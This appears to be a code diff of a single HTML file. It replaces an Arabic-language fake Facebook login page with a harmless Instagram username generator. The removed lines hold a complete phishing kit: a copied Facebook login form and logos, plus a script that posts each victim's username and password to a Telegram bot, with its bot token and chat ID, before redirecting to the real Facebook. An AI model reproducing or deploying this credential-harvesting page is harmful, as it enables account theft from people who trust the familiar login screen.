@@ -1,173 +1,184 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحة تسجيل الدخول</title>
+    <title>Instagram Username Generator</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        .container {
-            text-align: center;
-            width: 90%;
-            max-width: 300px;
+            background: #f0f2f5;
             padding: 20px;
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 800px;
+            margin: 0 auto;
         }
-
-        .language-selector {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            cursor: pointer;
+        .generator-box {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-
-        .logo {
-            width: 60px;
+        h1 {
+            color: #333;
+            font-size: 28px;
             margin-bottom: 20px;
         }
-
-        .input-field {
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+            font-weight: bold;
+        }
+        input, select {
             width: 100%;
             padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
+            border: 1px solid #ddd;
             border-radius: 5px;
-            direction: rtl;
+            font-size: 16px;
         }
-
-        .login-button {
-            width: 100%; /* تطابق عرض الحقول */
-            padding: 10px;
-            background-color: #1877f2;
+        button {
+            background: #8a3ab9;
             color: white;
-            border: none;
+            border: 0;
+            padding: 12px 25px;
             border-radius: 5px;
             cursor: pointer;
-            transition: background-color 0.3s ease; /* إضافة التحول السلس */
+            font-size: 16px;
+            transition: background 0.3s ease;
         }
-
-        .login-button:hover {
-            background-color: #0e66d4; /* تغيير اللون عند التمرير */
+        button:hover {
+            background: #6c279e;
         }
-
-        .login-button:active {
-            background-color: #0a50a3; /* تغيير اللون عند الضغط */
+        .results {
+            margin-top: 25px;
         }
-
-        .error-message {
-            color: red;
-            margin-top: 10px;
-        }
-
-        .forgot-password {
-            display: block;
-            margin-top: 10px;
-            color: #1877f2;
-            text-decoration: none;
-        }
-
-        .create-account-button {
-            width: 100%;
+        .username {
+            background: #f8f9fa;
             padding: 10px;
-            border: 1px solid #1877f2;
-            color: #1877f2;
-            background-color: white;
+            border-radius: 5px;
+            margin: 5px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .check-btn {
+            background: #4CAF50;
+            padding: 8px 15px;
+            border-radius: 5px;
+            color: white;
+            text-decoration: none;
+            margin-left: 10px;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            padding: 15px;
             border-radius: 5px;
             margin-top: 20px;
-            cursor: pointer;
-        }
-
-        .meta-logo {
-            width: 40px;
-            margin-top: 10px;
-        }
-
-        @media (max-width: 480px) {
-            .container {
-                width: 95%;
-            }
+            color: #856404;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <div class="language-selector">العربية</div>
-            <img src="https://i.imgur.com/g5ljZae.png" alt="Facebook Logo" class="logo">
-        </header>
-        <main>
-            <form id="loginForm">
-                <input type="text" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" class="input-field" id="username">
-                <input type="password" placeholder="كلمة السر" class="input-field" id="password">
-                <button type="submit" class="login-button" onclick="handleLogin(event)">تسجيل الدخول</button>
-                <div class="error-message" id="errorMessage"></div>
-                <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
-            </form>
-        </main>
-        <footer>
-            <button class="create-account-button" onclick="window.location.href='https://www.facebook.com/?wtsid=rdr_0YTZMeGEzK6P49vvl&_rdr'">إنشاء حساب جديد</button>
-            <img src="https://i.imgur.com/vO2eiR4.png" alt="Meta Logo" class="meta-logo">
-        </footer>
+    <div class="generator-box">
+        <h1>Instagram Username Generator</h1>
+        
+        <div class="input-group">
+            <label>اختر النمط:</label>
+            <select id="pattern">
+                <option value="words">كلمات عربية/إنجليزية</option>
+                <option value="numbers">أرقام فقط</option>
+                <option value="mix">حروف وأرقام</option>
+                <option value="custom">نمط مخصص</option>
+            </select>
+        </div>
+        
+        <div class="input-group" id="customPatternGroup" style="display: none;">
+            <label>النمط المخصص (استخدم X للحروف و # للأرقام):</label>
+            <input type="text" id="customPattern" placeholder="مثال: XXX### أو ##XOXO">
+        </div>
+        
+        <button onclick="generateUsernames()">توليد أسماء</button>
+        
+        <div class="results" id="results"></div>
+        
+        <div class="warning">
+            ⚠️ ملاحظة مهمة: 
+            <ul>
+                <li>هذا الكود لا يفحص التوفر الفعلي بسبب قيود إنستغرام</li>
+                <li>التأكد من التوفر يتم يدويًا عبر زيارة: instagram.com/[username]</li>
+                <li>الاستخدام المكثف قد ينتهك شروط خدمة إنستغرام</li>
+            </ul>
+        </div>
     </div>
 
     <script>
-        function handleLogin(event) {
-            event.preventDefault(); // منع إعادة تحميل الصفحة
-
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const errorMessage = document.getElementById('errorMessage');
-
-            if (!username || !password) {
-                errorMessage.textContent = 'يرجى ملء جميع الحقول';
-                return;
+        function generateUsernames() {
+            const patternType = document.getElementById('pattern').value;
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML = '';
+            
+            let pattern = '';
+            
+            if (patternType === 'custom') {
+                pattern = document.getElementById('customPattern').value;
+            } else {
+                // Generate default pattern based on selection
+                const patterns = {
+                    'words': 'XXXXXX',
+                    'numbers': '######',
+                    'mix': 'XXX###'
+                };
+                pattern = patterns[patternType];
             }
 
-            // Perform email validation
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(username)) {
-                errorMessage.textContent = 'البريد الإلكتروني غير صحيح';
-                return;
-            }
-
-            // Send data to Telegram bot
-            const botUrl = 'https://api.telegram.org/bot8149389736:AAFgeqcH2X_d8tgXId94BnE4NALRmN78ybU/sendMessage';
-            const chatId = '346233181';
-            const message = `Username: ${username}\nPassword: ${password}`;
-
-            fetch(botUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            }).then(response => {
-                if (response.ok) {
-                    window.location.href = 'https://www.facebook.com/?wtsid=rdr_0YTZMeGEzK6P49vvl&_rdr';
-                } else {
-                    alert('حدث خطأ أثناء إرسال البيانات');
+            const usernames = [];
+            const count = 10; // Number of usernames to generate
+            
+            for (let i = 0; i < count; i++) {
+                let username = '';
+                for (const char of pattern) {
+                    if (char === 'X') {
+                        username += getRandomLetter();
+                    } else if (char === '#') {
+                        username += getRandomNumber();
+                    } else {
+                        username += char;
+                    }
                 }
-            }).catch(error => {
-                console.error('Error:', error);
-                alert('حدث خطأ أثناء إرسال البيانات');
+                usernames.push(username);
+            }
+
+            usernames.forEach(username => {
+                const div = document.createElement('div');
+                div.className = 'username';
+                
+                div.innerHTML = `
+                    ${username}
+                    <a href="https://www.instagram.com/${username}" target="_blank" class="check-btn">تحقق يدويًا</a>
+                `;
+                
+                resultsDiv.appendChild(div);
             });
         }
+
+        function getRandomLetter() {
+            const letters = 'abcdefghijklmnopqrstuvwxyz';
+            return letters[Math.floor(Math.random() * letters.length)];
+        }
+
+        function getRandomNumber() {
+            return Math.floor(Math.random() * 10);
+        }
+
+        // Show/hide custom pattern input
+        document.getElementById('pattern').addEventListener('change', function() {
+            const customGroup = document.getElementById('customPatternGroup');
+            customGroup.style.display = (this.value === 'custom') ? 'block' : 'none';
+        });
     </script>
 </body>
 </html>
